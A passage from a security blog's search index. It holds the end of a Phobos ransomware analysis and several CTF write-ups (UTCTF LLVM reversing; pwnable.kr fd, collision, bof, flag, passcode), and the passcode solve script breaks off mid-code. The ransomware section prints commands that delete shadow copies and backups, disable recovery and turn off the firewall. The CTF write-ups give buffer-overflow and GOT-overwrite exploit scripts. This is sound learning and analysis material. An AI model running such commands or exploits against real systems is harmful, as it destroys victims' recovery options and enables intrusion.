onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe   Decrypting Strings   Going back to sub_403E72 (which returned the blacklisted processes), we can see that it’s called multiple times across the code.      If we look inside it we can see that it loads some data from the  .data section then gets a cryptographic key and calls  CryptDecrypt. This indicated that the .data section is encrypted and the code uses this function to decrypt data on demand (not decrypted all at once), this also explains why we didn’t find readable strings in the initial analysis.                                    What is attacked   After calling the decryption function multiple times we can see some interesting strings in the .data section:           Ransomware possible extensions:      .acute .actin .acton .actor .acuff .acuna .acute .adage .adair .adame .banhu .banjo .banks .banta .barak .caleb .cales .caley .calix .calle .calum .calvo .deuce .dever  .devil .devoe .devon .devos .dewar .eight .eject .eking .elbie .elbow .elder .phobos .help .blend .bqux .com .mamba .karlos .ddos .phoenix .plut .karma .bbc .capital                Attacked extensions:      .1cd .3ds .3fr .3g2 .3gp .7z .accda .accdb .accdc .accde .accdt .accdw .adb .adp .ai .ai3 .ai4 .ai5 .ai6 .ai7 .ai8 .anim .arw .as .asa .asc .ascx .asm .asmx .asp .aspx  .asr .asx .avi .avs .backup .bak .bay .bd .bin .bmp .bz2 .c .cdr .cer .cf .cfc .cfm  .cfml .cfu .chm .cin .class .clx .config .cpp .cr2 .crt .crw .cs .css .csv .cub .dae  .dat .db .dbf .dbx .dc3 .dcm .dcr .der .dib .dic .dif .divx .djvu .dng .doc .docm  .docx .dot .dotm .dotx .dpx .dqy .dsn .dt .dtd .dwg .dwt .dx .dxf .edml .efd .elf  .emf .emz .epf .eps .epsf .epsp .erf .exr .f4v .fido .flm .flv .frm .fxg .geo .gif  .grs .gz .h .hdr .hpp .hta .htc .htm .html .icb .ics .iff .inc .indd .ini .iqy .j2c  .j2k .java .jp2 .jpc .jpe .jpeg .jpf .jpg .jpx .js .jsf .json .jsp .kdc .kmz .kwm  .lasso .lbi .lgf .lgp .log .m1v .m4a .m4v .max .md .mda .mdb .mde .mdf .mdw .mef .mft .mfw .mht .mhtml .mka .mkidx .mkv .mos .mov .mp3 .mp4 .mpeg .mpg .mpv .mrw .msg .mxl .myd .myi .nef .nrw .obj .odb .odc .odm .odp .ods .oft .one .onepkg .onetoc2 .opt  .oqy .orf .p12 .p7b .p7c .pam .pbm .pct .pcx .pdd .pdf .pdp .pef .pem .pff .pfm  .pfx .pgm .php .php3 .php4 .php5 .phtml .pict .pl .pls .pm .png .pnm .pot .potm  .potx .ppa .ppam .ppm .pps .ppsm .ppt .pptm .pptx .prn .ps .psb .psd .pst .ptx .pub .pwm .pxr .py .qt .r3d .raf .rar .raw .rdf .rgbe .rle .rqy .rss .rtf .rw2 .rwl .safe .sct .sdpx .shtm .shtml .slk .sln .sql .sr2 .srf .srw .ssi .st .stm .svg .svgz .swf .tab .tar .tbb .tbi .tbk .tdi .tga .thmx .tif .tiff .tld .torrent .tpl .txt .u3d .udl .uxdc .vb .vbs .vcs .vda .vdr .vdw .vdx .vrp .vsd .vss .vst .vsw .vsx .vtm .vtml .vtx .wb2 .wav .wbm .wbmp .wim .wmf .wml .wmv .wpd .wps .x3f .xl .xla .xlam  .xlk .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xps .xsd .xsf .xsl  .xslt .xsn .xtp .xtp2 .xyze .xz .zip                Skipped files (not encrypted, probably):      info.hta info.txt boot.ini bootfont.bin ntldr ntdetect.com io.sys 1saas.exe           Executed Commands   Several commands gets executed in  sub_4030E4 before encrypting the files using  CreateProcessW:      Delete all Volumes Shadow Copies (volumes backup or snapshot)      vssadmin delete shadows /all /quiet    wmic shadowcopy delete           Disable windows recovery mode       bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no                Delete the backup catalog       wbadmin delete catalog -quiet                Turn off the firewall and exit       netsh advfirewall set currentprofile state off netsh firewall set opmode mode=disable exit           The Encryption Process   First the ransomware gets the logical drives then gets the volume serial number of the drive (32 bit value) and passes that value to the function  get_random_aes_key which uses that serial number to create a unique AES key for that drive.   After that the key is passed to  to_encryption_thread function which starts a new thread with the generated key as a ThreadParameter.      Although the key is the same for every file, the ransomware generates a random 16-bytes IV (initialization vector) for each file before encrypting it using  CryptGenRandom.      Here is a snapshot of get_random_value function:      Let’s track the encryption process for a file called “test.txt” to see how it’s encrypted.   Using the debugger we can get the randomly generated IV for this file (31 E8 39 C2 79 B8 BB C0 C4 2C 24 84 5D C2 56 40).      Next, open_and_encrypt function checks the file size, if it’s smaller than  0x180000 bytes it will go to  encrypt_small_files else it will go to  encrypt_large_files.   [   Encrypting Small Files   In the case of small files, The ransomware first creates a file with the new name (with the ransomware extension) then encrypts the file content and writes it to the newly created file.      After that, the ransomware writes some metadata after the encrypted file content (possibly checksums + original file name + some padding nulls). Then it writes the random IV (you can see that it’s the same IV from above).      Finally it writes the encrypted AES key to end of the file followed by .LOCK96 and encrypts the metadata block (checksums + original file name).                                    After the encryption is done, the ransomware deletes the original file      Here we can see two different small files after being encrypted and they have the same block at the end (encrypted AES key + “.LOCK96”):                                    Encrypting Large Files   Large files are encrypted differently, we can confirm that by creating a large file and filling it with \\xFF. after the encryption we can see that some parts of the file are left unencrypted and some other parts are zerod out.      At the end of file file we can see the random IV + the same block similar to the small files (encrypted AES key + “.LOCK96”).      Encrypting Network Shares   The ransomware searches through network shared resources at sub_401B7D and starts new encryption threads for these resources.         That wraps up the analysis. This is my first time to fully analysis a ransomware from start to finish and it has been a great learning experience.   IOCs   Hashes   Phobos: a91491f45b851a07f91ba5a200967921bf796d38677786de51a4a8fe5ddeafd2   Files   %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1saas.exe   %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1saas.exe   Registry   HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   Emails   lockhelp@qq[.]com   External References   https://blog.malwarebytes.com/threat-analysis/2019/07/a-deep-dive-into-phobos-ransomware/  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/phobos-ransomware/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/phobos-ransomware/7.png"
      },{
        "title": "UTCTF 2020 - IR",
        "excerpt":"category: Reverse Engineering      We found this snippet of code on our employee’s laptop. It looks really scary. Can you figure out what it does?     Challenge file: chal.e    This challenge is about reading LLVM IR (intermediate representation) language, let’s first get some knowledge about LLVM and then dive into the challenge.   LLVM in simple words:   The LLVM project has multiple components. The core of the project is itself called “LLVM”. This contains all of the tools, libraries, and header files needed to process intermediate representations (IR) and converts it into object files (machine code).   Each language has a frontend which is the actual compiler that generates the LLVM IR, some of them are:  clang (C / C++), llgo (Go), …   LLVM IR is a low-level programming language (much like assembly) and it provides type safety, low-level operations, flexibility, and the capability of representing “all” high-level languages cleanly and efficiently, one language to rule them all :)   For more about LLVM, see this video: https://www.youtube.com/watch?v=a5-WaD8VV38   Back to the challenge:   I will split the code into multiple sections to understand it more easily, I’ve removed some of the metadata like the “aligns” and “dbgs” for cleaner code.   @check = dso_local global [64 x i8] c\"\\03\\12\\1A\\17\\0A\\EC\\F2\\14\\0E\\05\\03\\1D\\19\\0E\\02\\0A\\1F\\07\\0C\\01\\17\\06\\0C\\0A\\19\\13\\0A\\16\\1C\\18\\08\\07\\1A\\03\\1D\\1C\\11\\0B\\F3\\87\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\05\" @MAX_SIZE = dso_local global i32 64   First we see two global variables,  check which is an array of 64 bytes with constant values (used for comparing with the input later) and MAX_SIZE which is a 32 bit integer  (i32) and its value is set to 64.     define dso_local i32 @_Z7reversePc(i8*) #0 {   %2 = alloca i32\t\t! define %2 as int   %3 = alloca i8*\t\t! define %3 as char*   %4 = alloca i32\t\t! define %4 as int   %5 = alloca i32\t\t! define %5 as int   %6 = alloca i32\t\t! define %6 as int   store i8* %0, i8** %3\t\t! %3 = %0  ==&gt; input   store i32 0, i32* %4\t\t! %4 = 0   br label %7\t\t\t! jmp to %7   Next  there is a function definition with the name _Z7reversePc which takes one argument of type char* (i8*) “which acts as the input” and it’s stored in variable %0.   Then five local variables are defined (%2 to %6), the input argument is stored in %3 and 0 is stored in %4, then we branch to label %7.           Variables in LLVM IR start with %.     LLVM IR has an infinite number of variables.     Data types are very similar to high level languages: i32 for 32 bit integer, i8* for 8 bit array (char array), and so on.        7:   %8 = load i32, i32* %4\t\t! %8 = %4  ==&gt; counter   %9 = load i32, i32* @MAX_SIZE\t\t! %9 = 64  ==&gt; MAX_SIZE   %10 = icmp slt i32 %8, %9\t\t! if(%8 &lt; %9):   br i1 %10, label %11, label %23\t! jmp to %11\telse: jmp to %23 ==&gt; end loop  11:   ! get input[i]   %12 = load i8*, i8** %3\t\t\t\t! %12 = %3  ==&gt; input   %13 = load i32, i32* %4\t\t\t\t! %13 = %4  ==&gt; counter   %14 = sext i32 %13 to i64\t\t\t\t! %14 = sign_extend(%13)  ==&gt; compiler stuff   %15 = getelementptr inbounds i8, i8* %12, i64 %14\t! %15 = get_memory(%12[%14])   %16 = load i8, i8* %15\t\t\t\t! %16 = *(%15)  ==&gt; dereference   %17 = sext i8 %16 to i32\t\t\t\t! 17 = sign_extend(%16)  ==&gt; compiler stuff      %18 = add nsw i32 %17, 5\t\t\t\t! %18 += %17 + 5    %19 = trunc i32 %18 to i8\t\t\t\t! %19 = truncate(%18)  ==&gt; compiler stuff   store i8 %19, i8* %15\t\t\t\t\t! %15 = %19  ==&gt; store the result back   br label %20\t\t\t\t\t\t! %jmp to %20  20:   %21 = load i32, i32* %4\t\t! %21 = %4  ==&gt; counter   %22 = add nsw i32 %21, 1\t\t! %22 = %21 + 1   store i32 %22, i32* %4\t\t! %4  = %22   br label %7\t\t\t\t! jmp back to %7   This section loops through the input stored at %3 with a counter stored at %4 from 0 to MAX_SIZE. At each iteration, it gets the character at input[counter] using getelementptr and adds 5 to it.           Some keywords like sext and trunc are just compiler generated code (may be for optimization) so ignore them here.     LLVM IR variables are immutable (can’t be changed), that’s why there is many variables for such simple operations.      The C equivalent to this is:   for(int i=0; i&lt;MAX_SIZE; i++)     input[i] += 5     23:   store i32 0, i32* %5\t\t! %5 = 0  ==&gt; counter   br label %24\t\t\t! jmp to %24  24:   %25 = load i32, i32* %5\t\t! %25 = %5  ==&gt; counter   %26 = load i32, i32* @MAX_SIZE\t! %26 = 64  ==&gt; MAX_SIZE   %27 = sub nsw i32 %26, 1\t\t! %27 = %26 - 1  ==&gt; MAX_SIZE-1   %28 = icmp slt i32 %25, %27\t\t! if(%25 &lt; %27)   br i1 %28, label %29, label %48\t! jmp to %29\telse: jmp to %48 ==&gt; end loop  29:   ! get input[i+1]   %30 = load i8*, i8** %3\t\t\t\t! %30 = %i3  ==&gt; input   %31 = load i32, i32* %5\t\t\t\t! %31 = %5  ==&gt; counter   %32 = add nsw i32 %31, 1\t\t\t\t! %32 = %31 + 1  ==&gt; counter+1   %33 = sext i32 %32 to i64\t\t\t\t! %33 = sign_extend(%32)  ==&gt; compiler stuff   %34 = getelementptr inbounds i8, i8* %30, i64 %33\t!%34 = get_memory(%30[%33])   %35 = load i8, i8* %34\t\t\t\t! %35 = *(%34)  ==&gt; dereference   %36 = sext i8 %35 to i32\t\t\t\t! %36 = sign_extend(%35)  ==&gt; compiler stuff      ! get input[i]   %37 = load i8*, i8** %3\t\t\t\t! %37 = %i3  ==&gt; input   %38 = load i32, i32* %5\t\t\t\t! %38 = %5  ==&gt; counter   %39 = sext i32 %38 to i64\t\t\t\t! %39 = sign_extend(%38)  ==&gt; compiler stuff   %40 = getelementptr inbounds i8, i8* %37, i64 %39\t! %40 = get_memory(%37[%39])   %41 = load i8, i8* %40\t\t\t\t! %41 = *(%40)  ==&gt; dereference   %42 = sext i8 %41 to i32\t\t\t\t! %42 = sign_extend(%41)  ==&gt; compiler stuff      %43 = xor i32 %42, %36\t\t\t\t! %43 = %42 ^ %36  ==&gt; input[i] ^ input[i+1]   %44 = trunc i32 %43 to i8\t\t\t\t! %44 = truncate(%43)  ==&gt; compiler stuff   store i8 %44, i8* %40\t\t\t\t\t! %40 = %44  ==&gt; store the result back   br label %45\t\t\t\t\t\t! jmp to %45  45:   %46 = load i32, i32* %5\t\t! %46 = %5  ==&gt; counter\t   %47 = add nsw i32 %46, 1\t\t! %47 = %46 + 1   store i32 %47, i32* %5\t\t! %5  = %47   br label %24\t\t\t\t! jmp back to %24   Here we can see another loop through the input which XORs each byte of the input with it’s adjacent one.   The C equivalent to this is:   for(int i=0; i&lt;MAX_SIZE-1; i++)     input[i] ^= input[i+1]     48:   store i32 0, i32* %6\t\t! %6 = 0  ==&gt; counter   br label %49\t\t\t! jmp to %49  49:   %50 = load i32, i32* %6\t\t! %50 = %6  ==&gt; counter   %51 = load i32, i32* @MAX_SIZE\t! %51 = 64  ==&gt; MAX_SIZE   %52 = icmp slt i32 %50, %51\t\t! if(%50 &lt; %51)   br i1 %52, label %53, label %71\t! jmp to %53\telse: jmp to %71 ==&gt; end loop  53:   ! get check[i]   %54 = load i32, i32* %6\t\t! %54 = %6  ==&gt; counter   %55 = sext i32 %54 to i64\t\t! %55 = sign_extend(%54)  ==&gt; compiler stuff   %56 = getelementptr inbounds [64 x i8], [64 x i8]* @check, i64 0, i64 %55 ! get_memory(%check[%55])   %57 = load i8, i8* %56\t\t! %57 = *(%56)  ==&gt; dereference   %58 = zext i8 %57 to i32\t\t! %58 = zero_extend(%57)  ==&gt; compiler stuff      ! get input[i]   %59 = load i8*, i8** %3\t\t\t\t! %59 = %i3  ==&gt; input   %60 = load i32, i32* %6\t\t\t\t! %60 = %6  ==&gt; counter   %61 = sext i32 %60 to i64\t\t\t\t! %61 = sign_extend(%60)  ==&gt; compiler stuff   %62 = getelementptr inbounds i8, i8* %59, i64 %61\t! %62 = get_memory(%59[%61])   %63 = load i8, i8* %62\t\t\t\t! %63 = *(%62)  ==&gt; dereference   %64 = zext i8 %63 to i32\t\t\t\t! %64 = zero_extend(%63)  ==&gt; compiler stuff      %65 = icmp ne i32 %58, %64\t\t\t\t! if(%58 != %64)  ==&gt; check[i] != input[i]   br i1 %65, label %66, label %67\t\t\t! jmp to %66 ==&gt; end loop    else: jmp to %67  66:   store i32 0, i32* %2\t\t! %2 = 0  ==&gt; return value   br label %72\t\t\t! jmp to %72  67:   br label %68\t\t\t! jmp to %68  68:   %69 = load i32, i32* %6\t! %69 = %6  ==&gt; counter   %70 = add nsw i32 %69, 1\t! %70 = %69 + 1   store i32 %70, i32* %6\t! %6  = %70   br label %49\t\t\t! jmp back to %49  71:   store i32 1, i32* %2\t\t! %2 = 1  ==&gt; return value   br label %72\t\t\t! jmp to %72  72:   %73 = load i32, i32* %2\t! %73 = %2   ret i32 %73\t\t\t! return %73 }   The final block just compares the modified input array with the check array to test for equality.   The C equivalent to this is:   for(int i=0; i&lt;MAX_SIZE; i++)     if(check[i] != input[i])         return 0; return 1;     Solution:   As you can see the final algorithm is so simple, we can reverse it and eventually get the flag :)   check = \"\\x03\\x12\\x1A\\x17\\x0A\\xEC\\xF2\\x14\\x0E\\x05\\x03\\x1D\\x19\\x0E\\x02\\x0A\\x1F\\x07\\x0C\\x01\\x17\\x06\\x0C\\x0A\\x19\\x13\\x0A\\x16\\x1C\\x18\\x08\\x07\\x1A\\x03\\x1D\\x1C\\x11\\x0B\\xF3\\x87\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\"  lcheck = [ord(i) for i in check]  for i in range(len(lcheck)-1, 0, -1): \tlcheck[i-1] = lcheck[i-1] ^ lcheck[i]  flag = \"\".join([chr(i-5) for i in lcheck]) print(flag)   The flag is: utflag{machine_agnostic_ir_is_wonderful}  ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/utctf2020-ir/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/utctf2020/logo.png"
      },{
        "title": "Pwnable.kr - fd",
        "excerpt":"   Challenge description:     Mommy! what is a file descriptor in Linux?     * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw    #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  char buf[32]; int main(int argc, char* argv[], char* envp[]){ \tif(argc&lt;2){ \t\tprintf(\"pass argv[1] a number\\n\"); \t\treturn 0; \t} \tint fd = atoi( argv[1] ) - 0x1234; \tint len = 0; \tlen = read(fd, buf, 32); \tif(!strcmp(\"LETMEWIN\\n\", buf)){ \t\tprintf(\"good job :)\\n\"); \t\tsystem(\"/bin/cat flag\"); \t\texit(0); \t} \tprintf(\"learn about Linux file IO\\n\"); \treturn 0; }   This challenge takes one command line argument, converts the argument to an integer and subtracts  0x1234 from it. The result is used as a file descriptor to read from.   After that the binary reads 32 bytes from that file descriptor and compares it with the value LETMEWIN.   The trick here is to choose a file descriptor that we can control it’s content, what’s better that the standard input :)   The standard input file descriptor is 0.   So to solve this challenge we need an argument with the value 4660 (4660 = 0x1234) and finally write LETMEWIN to the standard input.   Solution:   fd@pwnable:~$ echo \"LETMEWIN\" | ./fd 4660 good job :) mommy! I think I know what a file descriptor is!!   Flag: mommy! I think I know what a file descriptor is!!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/fd/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - collision",
        "excerpt":"   Challenge description:     Daddy told me about cool MD5 hash collision today. I wanna do something like that too!    #include &lt;stdio.h&gt; #include &lt;string.h&gt;  unsigned long hashcode = 0x21DD09EC;  unsigned long check_password(const char* p){ \tint* ip = (int*)p; \tint i; \tint res=0; \tfor(i=0; i&lt;5; i++){ \t\tres += ip[i]; \t} \treturn res; }  int main(int argc, char* argv[]){ \tif(argc&lt;2){ \t\tprintf(\"usage : %s [passcode]\\n\", argv[0]); \t\treturn 0; \t} \tif(strlen(argv[1]) != 20){ \t\tprintf(\"passcode length should be 20 bytes\\n\"); \t\treturn 0; \t}  \tif(hashcode == check_password( argv[1] )){ \t\tsystem(\"/bin/cat flag\"); \t\treturn 0; \t} \telse \t\tprintf(\"wrong passcode.\\n\"); \treturn 0; }   This challenge takes a 20 bytes passcode as input then checks it against some hashcode, if it’s the same we get the flag.   The checking function casts the input to an integer and loops over it 4 bytes at a time (integer is 4 bytes).   So to solve this challenge we need to enter 5 numbers add up to 0x21DD09EC (the hashcode value).   0x21DD09EC / 5 = 0x06C5CEC8 + remainder 0x4, we can add the remainder to any of the 5 numbers.   One thing to remember is that values are stored in memory in little endian form (higher bytes are stored in lower memory addresses), so if we need to enter the value 0x41424344 it will be 0x44434241. We can use python pwn tools to do this for us.   Solution:   #solve.py  from pwn import *  hashcode = 0x21DD09EC num = hashcode // 5 remainder = hashcode % 5  buf = \"\" buf += p32(num)\t# p32() converts to little endian buf += p32(num) buf += p32(num) buf += p32(num) buf += p32(num + remainder)  print(buf)   col@pwnable:~$ ./col $(python2 /tmp/solve.py) daddy! I just managed to create a hash collision :)   Flag: daddy! I just managed to create a hash collision :)  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/collision/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - bof",
        "excerpt":"   Challenge description:     Nana told me that buffer overflow is one of the most common software vulnerability.  Is that true?    #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt;  void func(int key){ \tchar overflowme[32]; \tprintf(\"overflow me : \"); \tgets(overflowme);\t// smash me! \tif(key == 0xcafebabe){ \t\tsystem(\"/bin/sh\"); \t} \telse{ \t\tprintf(\"Nah..\\n\"); \t} }  int main(int argc, char* argv[]){ \tfunc(0xdeadbeef); \treturn 0; }   This is a classic buffer overflow challenge, the code reads user input and stores it in a 32 bytes array using gets() which doesn’t do any size checking.   So if we enter say a hundred characters we will overflow the buffer array overflowme and write past it in memory.   The goal of this challenge is to overwrite key with the value  0xcafebabe, by default function arguments are stored at ebp+8, ebp+c, ..., there is only on argument so we now it’s at ebp+8 (note that in 64 bit systems, function arguments are stored in the registers).   Using GDB, we can disassemble func to know the exact offset of the input buffer array from the key argument.   gef➤  disassemble func  Dump of assembler code for function func: .....    0x56555644 &lt;+24&gt;:\tcall   0xf7e2db70 &lt;puts&gt; =&gt; 0x56555649 &lt;+29&gt;:\tlea    eax,[ebp-0x2c]    0x5655564c &lt;+32&gt;:\tmov    DWORD PTR [esp],eax    0x5655564f &lt;+35&gt;:\tcall   0xf7e2d0c0 &lt;gets&gt; =&gt; 0x56555654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe .....   Great, now we now the buffer is at offset 0x2c from ebp, so we need to send:   [0x2c characters to reach ebp + 4 bytes for saved ebp + 4 bytes for the return address + the value 0xcafebabe].   Solution:   #solve.py  from pwn import *  p = remote('pwnable.kr', 9000)  buf = \"\" buf += 'A' * 0x2c buf += 'XXXX'\t\t# saved ebp buf += 'XXXX'\t\t# ret address buf += p32(0xcafebabe)\t# value to overwrite key  p.send(buf) p.interactive()\t\t# for interactive shell   $ python2 solve.py [+] Opening connection to pwnable.kr on port 9000: Done [*] Switching to interactive mode  $ ls bof bof.c flag log log2 super.pl  $ cat flag daddy, I just pwned a buFFer :)   Flag: daddy, I just pwned a buFFer :)  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/bof/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - flag",
        "excerpt":"   Challenge description:     Papa brought me a packed present! let’s open it.    This challenge is just a simple reverse engineering task, from the challenge description we can guess that the binary is packed.   Using DIE (detect it easy), we can see that it’s packed using UPX.      we can unpack it easily using UPX:   $ upx -d flag                        Ultimate Packer for eXecutables                           Copyright (C) 1996 - 2018 UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018          File size         Ratio      Format      Name    --------------------   ------   -----------   -----------     883745 &lt;-    335288   37.94%   linux/amd64   flag  Unpacked 1 file.   Now that the binary is unpacked, let’s jump to ida and do some reversing.      We can see that the main function is copying the flag into rdx, if we follow it to the .data section we will get the flag.      Solution:   Flag:  UPX...? sounds like a delivery service :)  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/flag/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - passcode",
        "excerpt":"   Challenge description:     Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that?    #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;  void login(){ \tint passcode1; \tint passcode2;  \tprintf(\"enter passcode1 : \"); \tscanf(\"%d\", passcode1); \tfflush(stdin);  \t// ha! mommy told me that 32bit is vulnerable to bruteforcing :) \tprintf(\"enter passcode2 : \"); \tscanf(\"%d\", passcode2);  \tprintf(\"checking...\\n\"); \tif(passcode1==338150 &amp;&amp; passcode2==13371337){ \t\tprintf(\"Login OK!\\n\"); \t\tsystem(\"/bin/cat flag\"); \t} \telse { \t\tprintf(\"Login Failed!\\n\"); \t\texit(0); \t} }  void welcome(){ \tchar name[100]; \tprintf(\"enter you name : \"); \tscanf(\"%100s\", name); \tprintf(\"Welcome %s!\\n\", name); }  int main(){ \tprintf(\"Toddler's Secure Login System 1.0 beta.\\n\");  \twelcome(); \tlogin();  \t// something after login... \tprintf(\"Now I can safely trust you that you have credential :)\\n\"); \treturn 0;\t }   This challenge was a bit frustrating at first so let’s go easy.   First there is a call to welcome() which takes 100 characters of input and prints a welcome message, nothing wrong with it.   After that we have a call to login() which reads two integers (or it was intended to do that), then compares them with two constants and if they match we get the flag.   If you compiled this code you will get:   warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’   That’s a very famous C warning, the code is passing the variable itself instead of a pointer to it which will cause an arbitrary memory write and might cause an access violation.   if we run the program and enter two numbers we will get a segmentation fault:   $ ./passcode  Toddler's Secure Login System 1.0 beta. enter you name : test Welcome test! enter passcode1 : 1 enter passcode2 : 1 Segmentation fault (core dumped)   The first scanf() for passcode1 works just fine, we are writing to an arbitrary memory location but it somehow passed.   If only we could control where to write, we can overwrite any GOT entry with the address of the assembly instructions that calls system(\"/bin/cat flag\") and we are done.   Time for GDB:   gef➤  disassemble login  Dump of assembler code for function login: .....    0x0804857c &lt;+24&gt;:\tmov    edx,DWORD PTR [ebp-0x10]    0x0804857f &lt;+27&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x08048583 &lt;+31&gt;:\tmov    DWORD PTR [esp],eax    0x08048586 &lt;+34&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x0804858b &lt;+39&gt;:\tmov    eax,ds:0x804a02c .....  gef➤  b *0x0804857c Breakpoint 1 at 0x804857c  gef➤  r Starting program: /home/night-wolf/Downloads/passcode  Toddler's Secure Login System 1.0 beta. enter you name : test Welcome test!  gef➤  x/xw $ebp-0x10 0xffffd018:\t0xffffd074   As you can see, $ebp-0x10 which is the variable passcode1 is pointing to 0xffffd074 (the address scanf() is writing to).   The trick of this challenge is that after a function stack frame is destroyed, the next function will start at the same base pointer:    Func1 ------- | esp | | ... |\t\t Func2 | ... |\t\t------- | ... |\t\t| esp | | ... |\t\t| ... | | ... |\t\t| ... | | ebp |\t\t| ebp |\t\tsame base pointer -------\t\t-------\t\t\t\t   Now it’s time to make use of welcome() function, some values of the input array will be at the stack frame of login() function, we can use pwn cyclic to generate a pattern of 100 characters and fill the input array to see what happens.   $ pwn cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa   gef➤  r Starting program: /home/night-wolf/Downloads/passcode  Toddler's Secure Login System 1.0 beta. enter you name : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!  gef➤  x/20xw $esp 0xffffd000:\t0x61616173\t0x61616174\t0x61616175\t0x61616176 0xffffd010:\t0x61616177\t0x61616178\t0x61616179\t0xac31af00 0xffffd020:\t0xf7fa5000\t0xf7fa5000\t0xffffd048\t0x08048684 0xffffd030:\t0x080487f0\t0x00000000\t0x080486a9\t0x00000000 0xffffd040:\t0xf7fa5000\t0xf7fa5000\t0x00000000\t0xf7ddafb9  gef➤  x/xw $ebp-0x10 0xffffd018:\t0x61616179   As you can see, some values of input are still present in the login() stack frame, and also the passcode1 variable is overwritten with these values. To know the offset of these values from the beginning of the input array we can use pwn cyclic again with the value 0x61616179 which is the string yaaa (remember little endianness).   $ pwn cyclic -l yaaa 96   The value of passcode1 is overwritten by input[96] to input[99], unfortunately these are the last 4 bytes of input array so we cannot overwrite passcode2 (it would be too easy).   Back to our plan, now we have the ability to write to any arbitrary memory location we want, let’s overwrite some GOT entries :)   Using objdump we can get the addresses of the GOT entries:   $ objdump -R passcode   passcode:     file format elf32-i386  DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  08049ff0 R_386_GLOB_DAT    __gmon_start__ 0804a02c R_386_COPY        stdin@@GLIBC_2.0 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0 0804a014 R_386_JUMP_SLOT   __gmon_start__ 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7   The address of fflush() which is 0x0804a004 seems good, it doesn’t contain any bad characters like \\x00 or \\x0a.   Now to get the address of the assembly instructions that calls system(\"/bin/cat flag\"):   gef➤  disassemble login .....    0x080485e3 &lt;+127&gt;:\tmov    DWORD PTR [esp],0x80487af    0x080485ea &lt;+134&gt;:\tcall   0x8048460 &lt;system@plt&gt; .....   It’s at 0x080485e3, now get have all the pieces to complete this challenge. Remember that we need to send this address as a number string not as hex values.   Solution:   # solve.py  from pwn import *  buf = \"\" buf += 'A' * 96\t\t# offset to passcode1  buf += 